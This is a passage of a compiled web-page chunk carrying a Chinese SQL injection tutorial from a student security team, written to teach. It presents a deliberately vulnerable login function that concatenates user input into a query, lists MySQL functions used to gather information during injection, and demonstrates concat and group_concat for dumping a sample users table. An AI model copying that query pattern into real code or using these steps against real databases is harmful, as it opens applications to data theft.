import{_ as o,o as a,c as l,j as s,a as p,U as n}from"./chunks/framework.489e5108.js";const A=JSON.parse('{"title":"SQL 注入","description":"","frontmatter":{},"headers":[],"relativePath":"6.计算机安全/6.1.1SQL 注入.md","filePath":"6.计算机安全/6.1.1SQL 注入.md","lastUpdated":1696176798000}'),e={name:"6.计算机安全/6.1.1SQL 注入.md"},t=n(`<h1 id="sql-注入" tabindex="-1">SQL 注入 <a class="header-anchor" href="#sql-注入" aria-label="Permalink to &quot;SQL 注入&quot;">​</a></h1><p>Author: <code>Liki4</code> from Vidar-Team</p><p>Vidar-Team 2023 招新 QQ 群：861507440（仅向校内开放）</p><p>Vidar-Team 官网：<a href="https://vidar.club/" target="_blank" rel="noreferrer">https://vidar.club/</a></p><p>Vidar-Team 招新报名表：<a href="https://reg.vidar.club/" target="_blank" rel="noreferrer">https://reg.vidar.club/</a></p><p>本文中所有涉及的代码全部都托管在 <a href="https://github.com/Liki4/SQLi" target="_blank" rel="noreferrer">https://github.com/Liki4/SQLi</a></p><h2 id="前言" tabindex="-1">前言 <a class="header-anchor" href="#前言" aria-label="Permalink to &quot;前言&quot;">​</a></h2><p>在当代优秀年轻程序员设计与编写 Web 应用的时候，或多或少会使用到一种叫数据库的东西，如字面意义，这种东西通常用来储存数据，例如用户的个人信息，账户名称和密码等。</p><p>当然这些东西即便用记事本也可以储存，只需要将数据输出到一个文本文件里，事后需要使用的时候再搜索即可。但当数据量逐渐庞大，又对数据的增删改查有所需求的时候，记事本就显得有些心有余而力不足了。</p><p>于是数据库诞生了，随之诞生了一种名为 SQL 的语言，用以对数据库进行增删改查和更多其他的操作。使用 SQL 语句，可以方便地从数据库中查询出想要的数据，可以方便地找出不同类型数据之间的联系并对他们进行一定的操作。例如当今天你没有做核酸的时候，某些系统就会找出你的个人信息，并对你的健康码进行一个改天换色，同时也将对你的出行码等信息造成影响，这其中所有的过程都离不开 SQL 语句的辛勤付出，因此对其进行研究是非常必要的 :-p</p><p>有关 SQL 语句的基本知识，可以参考 <a href="https://www.w3schools.com/sql/" target="_blank" rel="noreferrer">SQL Tutorial</a></p><h2 id="简介" tabindex="-1">简介 <a class="header-anchor" href="#简介" aria-label="Permalink to &quot;简介&quot;">​</a></h2><p>在旧时代诞生的 Web 应用，不少都直接使用了原始 SQL 语句拼接的方式来完成查询，举个例子</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">check_pass</span><span style="color:#E1E4E8;">(username, password):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">hash</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> conn.exec(</span><span style="color:#F97583;">f</span><span style="color:#9ECBFF;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#79B8FF;">{</span><span style="color:#E1E4E8;">username</span><span style="color:#79B8FF;">}</span><span style="color:#9ECBFF;">&#39;&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> (sha256(password) </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">hash</span><span style="color:#E1E4E8;">)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">check_pass</span><span style="color:#24292E;">(username, password):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">hash</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> conn.exec(</span><span style="color:#D73A49;">f</span><span style="color:#032F62;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#005CC5;">{</span><span style="color:#24292E;">username</span><span style="color:#005CC5;">}</span><span style="color:#032F62;">&#39;&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> (sha256(password) </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">hash</span><span style="color:#24292E;">)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>这是一个普通 Web 应用里常见的密码校验函数，的伪代码</p><p>从 <code>users</code> 表中查出 <code>username</code> 对应的 <code>password</code> 的哈希值，将其与用户传入的密码哈希值进行比对，若相等则意味着用户传入的密码与数据库中储存的密码相吻合，于是返回准许登录</p><p><img src="https://cdn.xyxsw.site/boxcnHiNBWN86AR4AvSSsUVwSWb.png" alt=""></p><p>那么问题来了，在语句</p><div class="language-sql vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;{username}&#39;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;{username}&#39;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>之中，如果参数 <code>username</code> 未经过校验，直接使用用户传入的原生字符串，会不会出现什么问题呢？</p><p>这就是本篇 SQL 注入要讨论的问题</p><h2 id="sql-注入中的信息搜集" tabindex="-1">SQL 注入中的信息搜集 <a class="header-anchor" href="#sql-注入中的信息搜集" aria-label="Permalink to &quot;SQL 注入中的信息搜集&quot;">​</a></h2><h3 id="信息的获取" tabindex="-1">信息的获取 <a class="header-anchor" href="#信息的获取" aria-label="Permalink to &quot;信息的获取&quot;">​</a></h3><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">. version() 数据库版本</span></span>
<span class="line"><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;">. user() 数据库用户名</span></span>
<span class="line"><span style="color:#79B8FF;">3</span><span style="color:#E1E4E8;">. database() 数据库名</span></span>
<span class="line"><span style="color:#79B8FF;">4</span><span style="color:#E1E4E8;">. </span><span style="color:#F97583;">@@</span><span style="color:#E1E4E8;">datadir 数据库路径</span></span>
<span class="line"><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">. </span><span style="color:#F97583;">@@</span><span style="color:#E1E4E8;">version_compile_os 操作系统版本</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">1</span><span style="color:#24292E;">. version() 数据库版本</span></span>
<span class="line"><span style="color:#005CC5;">2</span><span style="color:#24292E;">. user() 数据库用户名</span></span>
<span class="line"><span style="color:#005CC5;">3</span><span style="color:#24292E;">. database() 数据库名</span></span>
<span class="line"><span style="color:#005CC5;">4</span><span style="color:#24292E;">. </span><span style="color:#D73A49;">@@</span><span style="color:#24292E;">datadir 数据库路径</span></span>
<span class="line"><span style="color:#005CC5;">5</span><span style="color:#24292E;">. </span><span style="color:#D73A49;">@@</span><span style="color:#24292E;">version_compile_os 操作系统版本</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="字符串拼接" tabindex="-1">字符串拼接 <a class="header-anchor" href="#字符串拼接" aria-label="Permalink to &quot;字符串拼接&quot;">​</a></h3><ol><li><code>concat(str1,str2,…)</code> 能够将你查询的字段连接在一起</li><li><code>concat_ws(separator,str1,str2,)</code> 能够自定义分隔符来将你查询的字段链接在一起</li><li><code>group_concat([DISTINCT] column [Order BY ASC/DESC column] [Separator separator])</code></li></ol><p>一般来说这个函数是配合 <code>group by</code> 子句来使用的，但是在 SQL 注入中，我们用他来输出查询出来的所有数据</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select </span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">, username, password </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> users</span><span style="color:#FDAEB7;font-style:italic;">;</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">----</span><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">----------</span><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> username </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> password   </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">----</span><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">----------</span><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> Dumb     </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> Dumb       </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> Angelina </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> I</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">kill</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">you </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">3</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> Dummy    </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> p</span><span style="color:#F97583;">@</span><span style="color:#E1E4E8;">ssword   </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">4</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> secure   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> crappy     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> stupid   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> stupidity  </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">6</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> superman </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> genious    </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">7</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> batman   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> mob</span><span style="color:#FDAEB7;font-style:italic;">!</span><span style="color:#E1E4E8;">le     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">8</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin    </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin      </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">9</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin1   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin1     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">10</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin2   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin2     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">11</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin3   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin3     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">12</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> dhakkan  </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> dumbo      </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">14</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin4   </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> admin4     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">----</span><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">----------</span><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#79B8FF;">13</span><span style="color:#E1E4E8;"> rows </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">0.01</span><span style="color:#E1E4E8;"> sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select concat(</span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">,username,password) </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> users</span><span style="color:#FDAEB7;font-style:italic;">;</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> concat(</span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">,username,password) </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">1DumbDumb</span><span style="color:#E1E4E8;">                    </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">2AngelinaI</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">kill</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">you          </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">3Dummyp</span><span style="color:#F97583;">@</span><span style="color:#E1E4E8;">ssword               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">4securecrappy</span><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">5stupidstupidity</span><span style="color:#E1E4E8;">             </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">6supermangenious</span><span style="color:#E1E4E8;">             </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">7batmanmob!</span><span style="color:#E1E4E8;">le                </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">8adminadmin</span><span style="color:#E1E4E8;">                  </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">9admin1admin1</span><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">10admin2admin2</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">11admin3admin3</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">12dhakkandumbo</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">14admin4admin4</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#79B8FF;">13</span><span style="color:#E1E4E8;"> rows </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">0.01</span><span style="color:#E1E4E8;"> sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select concat(</span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">,username,password) </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> users</span><span style="color:#FDAEB7;font-style:italic;">;</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> concat(</span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">,username,password) </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">1DumbDumb</span><span style="color:#E1E4E8;">                    </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">2AngelinaI</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">kill</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">you          </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">3Dummyp</span><span style="color:#F97583;">@</span><span style="color:#E1E4E8;">ssword               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">4securecrappy</span><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">5stupidstupidity</span><span style="color:#E1E4E8;">             </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">6supermangenious</span><span style="color:#E1E4E8;">             </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">7batmanmob!</span><span style="color:#E1E4E8;">le                </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">8adminadmin</span><span style="color:#E1E4E8;">                  </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">9admin1admin1</span><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">10admin2admin2</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">11admin3admin3</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">12dhakkandumbo</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">14admin4admin4</span><span style="color:#E1E4E8;">               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#79B8FF;">13</span><span style="color:#E1E4E8;"> rows </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">0.01</span><span style="color:#E1E4E8;"> sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select group_concat(</span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">,username separator </span><span style="color:#9ECBFF;">&#39;_&#39;</span><span style="color:#E1E4E8;">) </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> users</span><span style="color:#FDAEB7;font-style:italic;">;</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">--------------------------------------------------------------------------------------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> group_concat(</span><span style="color:#79B8FF;">id</span><span style="color:#E1E4E8;">,username separator </span><span style="color:#9ECBFF;">&#39;_&#39;</span><span style="color:#E1E4E8;">)                                                                      </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">--------------------------------------------------------------------------------------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#FDAEB7;font-style:italic;">1Dumb_2Angelina_3Dummy_4secure_5stupid_6superman_7batman_8admin_9admin1_10admin2_11admin3_12dhakkan_14admin4</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+</span><span style="color:#FDAEB7;font-style:italic;">--------------------------------------------------------------------------------------------------------------</span><span style="color:#F97583;">+</span></span>
<span class="line"><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> row </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">0.00</span><span style="color:#E1E4E8;"> sec)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select </span><span style="color:#005CC5;">id</span><span style="color:#24292E;">, username, password </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> users</span><span style="color:#B31D28;font-style:italic;">;</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">----</span><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">----------</span><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">id</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> username </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> password   </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">----</span><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">----------</span><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> Dumb     </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> Dumb       </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">2</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> Angelina </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> I</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">kill</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">you </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">3</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> Dummy    </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> p</span><span style="color:#D73A49;">@</span><span style="color:#24292E;">ssword   </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">4</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> secure   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> crappy     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">5</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> stupid   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> stupidity  </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">6</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> superman </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> genious    </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">7</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> batman   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> mob</span><span style="color:#B31D28;font-style:italic;">!</span><span style="color:#24292E;">le     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">8</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin    </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin      </span><span style="color:#D73A49;">|</span></span>
